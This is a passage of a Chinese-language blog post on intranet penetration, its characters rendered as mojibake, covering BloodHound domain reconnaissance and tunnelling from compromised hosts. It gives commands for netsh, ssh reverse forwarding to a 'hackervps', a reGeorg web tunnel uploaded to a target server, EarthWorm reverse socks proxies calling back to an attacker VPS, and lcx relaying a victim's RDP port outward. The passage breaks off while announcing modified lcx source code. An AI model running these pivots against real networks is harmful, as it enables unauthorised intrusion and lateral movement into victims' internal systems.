class="line">https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–‡æ¡£ç›´æ¥çœ‹è¿™è¾¹å³å¯äº†ï¼Œæˆ‘å°±æ‡’å¾—copyè¿‡æ¥äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bloodhound.readthedocs.io&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸€ä¸ªPSç‰ˆæœ¬ä¸€ä¸ªexeç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe  -c all</span><br></pre></td></tr></table></figure><p>è¿è¡Œåä¼šåœ¨æœ¬åœ°ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/46.png" alt="image-20200801121332755"></p><p>æ¥ä¸‹æ¥è¦æ­ä¸ªæœåŠ¡å™¨ï¼Œæˆ‘ä»¬éœ€è¦å¦‚ä¸‹æ¸…å•</p><ul><li>neo4j-community-4.1.1-windows</li><li>BloodHound-win32-x64</li><li>JAVAç¯å¢ƒï¼ˆOpenJDK 11ï¼‰</li></ul><p>æ­å»ºæ­¥éª¤è·Ÿå®˜æ–¹æ–‡æ¡£èµ°å°±å¥½äº†ï¼Œæˆ‘è¿™è¾¹å°±ç”¨kaliæ­neo4jæœåŠ¡äº†ï¼Œä¸æƒ³ç ´åwindowsç›®å‰çš„ç¯å¢ƒ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/47.png" alt="image-20200801124946426"></p><p>è¿™æ˜¯è¿æ¥ä¸Šäº†çš„ç¯å¢ƒï¼Œå¹¶ä¸”å¤„ç†äº†æˆ‘ä»¬å…ˆç”Ÿæˆçš„zipæ ¼å¼æ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/48.png" alt="image-20200801125325408"></p><p>æ‰¾åˆ°åŸŸç¯å¢ƒç®¡ç†å‘˜æœ€çŸ­è·¯å¾„ï¼Œè¿™å·¥å…·ç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œä¸æ•¢ä¹±å†™ï¼Œåé¢ç ”ç©¶ä¸‹è¡¥å……ä¸‹</p><h2 id="ç‹¡å…”ä¸‰çªŸ"><a href="#ç‹¡å…”ä¸‰çªŸ" class="headerlink" title="ç‹¡å…”ä¸‰çªŸ"></a>ç‹¡å…”ä¸‰çªŸ</h2><h3 id="æ˜¯å¦å‡ºç½‘"><a href="#æ˜¯å¦å‡ºç½‘" class="headerlink" title="æ˜¯å¦å‡ºç½‘"></a>æ˜¯å¦å‡ºç½‘</h3><p>ç®€å•çš„å‘½ä»¤å¦‚ä¸‹ï¼Œå¤æ‚ç‚¹çš„å¯ä»¥çœ‹<a href="https://www.ascotbe.com/2020/07/12/RemoteDownlo">æ¶æ„ç¨‹åºç ”ç©¶ä¹‹è¿œç¨‹ä¸‹è½½æ¶æ„ç¨‹åº</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping</span><br><span class="line">curl</span><br><span class="line">nslookup</span><br></pre></td></tr></table></figure><h3 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h3><h4 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h4><p>netshæ˜¯windowsè‡ªå¸¦çš„å‘½ä»¤ï¼Œå¯ä»¥å…è®¸ä¿®æ”¹è®¡ç®—æœºçš„ç½‘ç»œé…ç½®ã€‚ä¹Ÿå¯ä»¥è¢«æ‹¿æ¥åšç«¯å£è½¬å‘ã€‚</p><p>è¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-tw&#x2F;windows-server&#x2F;networking&#x2F;technologies&#x2F;netsh&#x2F;netsh-contexts</span><br></pre></td></tr></table></figure><p>Aæœºå™¨æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface portproxy add v4tov4 listenport&#x3D;5555 connectport&#x3D;3389 connectaddress&#x3D;192.168.1.1  protocol&#x3D;tcp</span><br></pre></td></tr></table></figure><p>Bæœºå™¨è®¿é—®Aæœºå™¨çš„5555ç«¯å£ï¼Œå³æ˜¯192.168.1.1çš„3389ç«¯å£</p><h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>sshä¸€èˆ¬è¢«æ‹¿æ¥ç™»å½•linuxæœºå™¨ï¼Œä¹Ÿå¯ä»¥æ‹¿æ¥åšä»£ç†å’Œè½¬å‘ã€‚</p><h5 id="å‚æ•°è§£é‡Š"><a href="#å‚æ•°è§£é‡Š" class="headerlink" title="å‚æ•°è§£é‡Š"></a>å‚æ•°è§£é‡Š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">-1ï¼šå¼ºåˆ¶ä½¿ç”¨sshåè®®ç‰ˆæœ¬1.</span><br><span class="line">-2ï¼šå¼ºåˆ¶ä½¿ç”¨sshåè®®ç‰ˆæœ¬2.</span><br><span class="line">-4ï¼šå¼ºåˆ¶ä½¿ç”¨IPv4åœ°å€.</span><br><span class="line">-6ï¼šå¼ºåˆ¶ä½¿ç”¨IPv6åœ°å€.</span><br><span class="line">-Aï¼šå¼€å¯è®¤è¯ä»£ç†è¿æ¥è½¬å‘åŠŸèƒ½.</span><br><span class="line">-aï¼šå…³é—­è®¤è¯ä»£ç†è¿æ¥è½¬å‘åŠŸèƒ½.</span><br><span class="line">-b bind_address</span><br><span class="line">ä½¿ç”¨æœ¬æœºæŒ‡å®šåœ°å€ä½œä¸ºå¯¹åº”è¿æ¥çš„æºipåœ°å€.</span><br><span class="line">-c blowfish|3des|des</span><br><span class="line">è¯·æ±‚å‹ç¼©æ‰€æœ‰æ•°æ®.</span><br><span class="line">-C:è¦æ±‚è¿›è¡Œæ•°æ®å‹ç¼© (åŒ…æ‹¬ stdin, stdout, stderr ä»¥åŠè½¬å‘ X11 å’Œ TCP&#x2F;IP è¿æ¥ çš„æ•°æ®).</span><br><span class="line">-D port</span><br><span class="line">    æŒ‡å®šä¸€ä¸ªæœ¬åœ°æœºå™¨ &#96;&#96;åŠ¨æ€çš„ åº”ç”¨ç¨‹åºç«¯å£è½¬å‘. </span><br><span class="line">-F configfile</span><br><span class="line">æŒ‡å®šsshæŒ‡ä»¤çš„é…ç½®æ–‡ä»¶.</span><br><span class="line">-fï¼šåå°æ‰§è¡ŒsshæŒ‡ä»¤.</span><br><span class="line">-gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥ä¸»æœºçš„è½¬å‘ç«¯å£.</span><br><span class="line">-i identity_file</span><br><span class="line">æŒ‡å®šèº«ä»½æ–‡ä»¶.</span><br><span class="line">-I smartcard_device</span><br><span class="line">    æŒ‡å®šæ™ºèƒ½å¡(smartcard)è®¾å¤‡. å‚æ•°æ˜¯è®¾å¤‡æ–‡ä»¶, èƒ½å¤Ÿç”¨å®ƒå’Œæ™ºèƒ½å¡é€šä¿¡, æ™ºèƒ½å¡é‡Œé¢å­˜å‚¨äº†ç”¨æˆ·çš„ RSA ç§é’¥.</span><br><span class="line">-l login_name</span><br><span class="line">æŒ‡å®šè¿æ¥è¿œç¨‹æœåŠ¡å™¨ç™»å½•ç”¨æˆ·å.</span><br><span class="line">-L port:host:hostport</span><br><span class="line">    å°†æœ¬åœ°æœº(å®¢æˆ·æœº)çš„æŸä¸ªç«¯å£è½¬å‘åˆ°è¿œç«¯æŒ‡å®šæœºå™¨çš„æŒ‡å®šç«¯å£. </span><br><span class="line">-kï¼šç¦æ­¢è½¬å‘ Kerberos é—¨ç¥¨å’Œ AFS ä»¤ç‰Œ. </span><br><span class="line">-m mac_spec</span><br><span class="line">    å¦å¤–, å¯¹äºåè®®ç¬¬äºŒç‰ˆ, è¿™é‡Œå¯ä»¥æŒ‡å®šä¸€ç»„ç”¨é€—å·éš”å¼€, æŒ‰ä¼˜å…ˆé¡ºåºæ’åˆ—çš„ MAC(æ¶ˆæ¯éªŒè¯ç )ç®—æ³• (message authentication code). </span><br><span class="line">-nï¼šæŠŠ stdin é‡å®šå‘åˆ° &#x2F;dev&#x2F;null (å®é™…ä¸Šé˜²æ­¢ä» stdin è¯»å–æ•°æ®). </span><br><span class="line">-Nï¼šä¸æ‰§è¡Œè¿œç¨‹æŒ‡ä»¤,ç”¨äºè½¬å‘ç«¯å£.</span><br><span class="line">-o option</span><br><span class="line">æŒ‡å®šé…ç½®é€‰é¡¹.</span><br><span class="line">-p port</span><br><span class="line">æŒ‡å®šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ç«¯å£.</span><br><span class="line">-qï¼šé™é»˜æ¨¡å¼.</span><br><span class="line">-s:è¯·æ±‚è¿œç¨‹ç³»ç»Ÿæ¿€æ´»ä¸€ä¸ªå­ç³»ç»Ÿ.</span><br><span class="line">-R port:host:hostport</span><br><span class="line">    å°†è¿œç¨‹ä¸»æœº(æœåŠ¡å™¨)çš„æŸä¸ªç«¯å£è½¬å‘åˆ°æœ¬åœ°ç«¯æŒ‡å®šæœºå™¨çš„æŒ‡å®šç«¯å£. </span><br><span class="line">-t:å¼ºåˆ¶åˆ†é…ä¼ªç»ˆç«¯.</span><br><span class="line">-T:ç¦æ­¢åˆ†é…ä¼ªç»ˆç«¯.</span><br><span class="line">-v:å†—è¯¦æ¨¡å¼.</span><br><span class="line">-Xï¼šå¼€å¯X11è½¬å‘åŠŸèƒ½.</span><br><span class="line">-xï¼šå…³é—­X11è½¬å‘åŠŸèƒ½.</span><br><span class="line">-yï¼šå¼€å¯ä¿¡ä»»X11è½¬å‘åŠŸèƒ½.</span><br></pre></td></tr></table></figure><ul><li><p>å¼€å¯socksä»£ç†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 6666 root@1.1.1.1</span><br></pre></td></tr></table></figure><p>è¾“å…¥1.1.1.1æœºå™¨å¯†ç ï¼Œæœ¬åœ°åˆ©ç”¨proxychainsç­‰ç±»ä¼¼å·¥å…·è¿æ¥æœ¬åœ°çš„6666ç«¯å£çš„sock5è¿æ¥å³å¯ä»£ç†1.1.1.1çš„ç½‘ç»œã€‚</p></li><li><p>æ§åˆ¶Aã€Bæœºå™¨ï¼ŒAèƒ½å¤Ÿè®¿é—®Bï¼Œä¸”èƒ½å‡ºç½‘ï¼ŒBèƒ½å¤Ÿè®¿é—®Cï¼Œä½†ä¸èƒ½å‡ºç½‘ï¼ŒAä¸èƒ½è®¿é—®Cï¼š</p><p>Aæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 2121:CIP:21 root@BIP</span><br></pre></td></tr></table></figure><p>è¾“å…¥BIPæœºå™¨å¯†ç ï¼Œè®¿é—®Açš„2121ç«¯å£å³æ˜¯è®¿é—®CIPçš„21ç«¯å£ã€‚</p></li><li><p>æ§åˆ¶Aæœºå™¨ï¼ŒAèƒ½å¤Ÿè®¿é—®Bï¼š</p><p>Aæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 2121:BIP:21 root@hackervps</span><br></pre></td></tr></table></figure><p>è¾“å…¥é»‘å®¢vpså¯†ç ï¼Œè®¿é—®é»‘å®¢vpsçš„2121ç«¯å£å³æ˜¯è®¿é—®BIPçš„21ç«¯å£ã€‚</p></li></ul><h4 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h4><p>reGeorgæ˜¯ä¸€æ¬¾å¼€æºçš„socksä»£ç†è½¯ä»¶ï¼Œå¯ä»¥è§£å†³å½“æœºå™¨ä¸å‡ºç½‘æ—¶ï¼Œä½¿ç”¨httpä»£ç†è¿›å…¥å†…ç½‘ã€‚</p><p>é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;reGeorg</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç½‘ç«™æ”¯æŒçš„è¯­è¨€ï¼ŒæŠŠç›¸åº”çš„tunnel.xxä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œè®¿é—®tunnel.xxæ˜¾ç¤ºâ€œGeorg says, â€˜All seems fineâ€™â€ï¼Œè¯´æ˜åŸºæœ¬okã€‚</p><p>ç„¶åæœ¬åœ°è®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythonreGeorgSocksProxy.py -p 9999 -u http://1.1.1.1:8080/tunnel.xx</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨proxychainsç­‰ç±»ä¼¼å·¥å…·è¿æ¥æœ¬åœ°çš„9999ç«¯å£çš„sock5è¿æ¥å³å¯ä»£ç†1.1.1.1çš„ç½‘ç»œã€‚</p><h4 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h4><p>å®˜ç½‘æœ‰ä½¿ç”¨æ–‡æ¡£å’Œä¸‹è½½åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;EarthWorm&#x2F;</span><br></pre></td></tr></table></figure><ul><li><p>å—å®³è€…æœºå™¨æœ‰å¤–ç½‘ipå¹¶å¯ç›´æ¥è®¿é—®</p><p>æŠŠewä¼ åˆ°å¯¹æ–¹æœåŠ¡å™¨ä¸Šï¼Œæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 8888</span><br></pre></td></tr></table></figure><p>ç°åœ¨æœ¬åœ°åˆ©ç”¨proxychainsç­‰ç±»ä¼¼å·¥å…·è¿æ¥æœ¬åœ°çš„å¯¹æ–¹æœåŠ¡å™¨çš„8888ç«¯å£çš„sock5è¿æ¥å³å¯ä»£ç†å¯¹æ–¹çš„ç½‘ç»œã€‚</p></li><li><p>æ§åˆ¶Aæœºå™¨ï¼ŒAèƒ½å¤Ÿè®¿é—®Bï¼Œé€šè¿‡Aè®¿é—®B</p><p>åœ¨è‡ªå·±å¤–ç½‘æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p>å¯¹æ–¹æœåŠ¡å™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d yourvpsip -e 8888</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨proxychainsç­‰ç±»ä¼¼å·¥å…·å¯é€šè¿‡è¿æ¥ä½ çš„å¤–ç½‘vpsçš„1080 ç«¯å£çš„socks5ï¼Œå³å¯ä»£ç†å—å®³è€…æœåŠ¡å™¨çš„ç½‘ç»œã€‚</p></li><li><p>æ§åˆ¶Aã€Bæœºå™¨ï¼ŒAèƒ½å¤Ÿè®¿é—®Bï¼ŒBèƒ½å¤Ÿè®¿é—®Cï¼ŒAæœ‰å¤–ç½‘ipå¹¶å¯ç›´æ¥è®¿é—®ï¼Œé€šè¿‡Aæ¥ä½¿ç”¨Bçš„æµé‡è®¿é—®C</p><p>Bæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p>Aæœºå™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f BIP -g 9999</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨proxychainsç­‰ç±»ä¼¼å·¥å…·å¯é€šè¿‡è¿æ¥Açš„1080 ç«¯å£çš„socks5ï¼Œå³å¯ä»£ç†BæœåŠ¡å™¨çš„ç½‘ç»œã€‚</p></li><li><p>æ§åˆ¶Aã€Bæœºå™¨ï¼ŒAèƒ½å¤Ÿè®¿é—®Bï¼ŒBèƒ½å¤Ÿè®¿é—®Cï¼ŒAæ²¡æœ‰å¤–ç½‘ipï¼Œé€šè¿‡Aè¿æ¥è‡ªå·±çš„å¤–ç½‘vpsæ¥ä½¿ç”¨Bçš„æµé‡è®¿é—®Cï¼š</p><p>è‡ªå·±vpsæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p>Bæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p>Aæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨proxychainsç­‰ç±»ä¼¼å·¥å…·å¯é€šè¿‡è¿æ¥ä½ è‡ªå·±çš„vpsçš„1080 ç«¯å£çš„socks5ï¼Œå³å¯ä»£ç†BæœåŠ¡å™¨çš„ç½‘ç»œã€‚</p></li></ul><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><p>lcxæ˜¯ä¸€æ¬¾è½»ä¾¿çš„ç«¯å£è½¬å‘å·¥å…·ã€‚</p><ul><li><p>åå‘è½¬å‘</p><p>å¤–ç½‘VPSæœºå™¨ç›‘å¬ï¼š</p><p>1111ä¸ºè½¬å‘ç«¯å£ï¼Œ2222ä¸ºæœ¬æœºä»»æ„æœªè¢«å ç”¨çš„ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 1111 2222</span><br></pre></td></tr></table></figure><p>å—å®³è€…æœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave VPSip 1111 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>è¿æ¥å¤–ç½‘VPSæœºå™¨çš„2222ç«¯å£å³æ˜¯è¿æ¥å—å®³è€…æœºå™¨çš„3389ã€‚</p></li><li><p>æ­£å‘è½¬å‘</p><p>Aæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 1111 2.2.2.2 8080</span><br></pre></td></tr></table></figure><p>è®¿é—®Aæœºå™¨çš„1111ç«¯å£å³æ˜¯è®¿é—®2.2.2.2çš„8080ç«¯å£ã€‚</p></li></ul><p>è¿™è¾¹åªæ‰¾åˆ°æºç ï¼Œæˆ‘æ”¹äº†ä¸€ä¸‹VS2019å¯ä»¥ç¼–è¯‘é€šè¿‡</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span 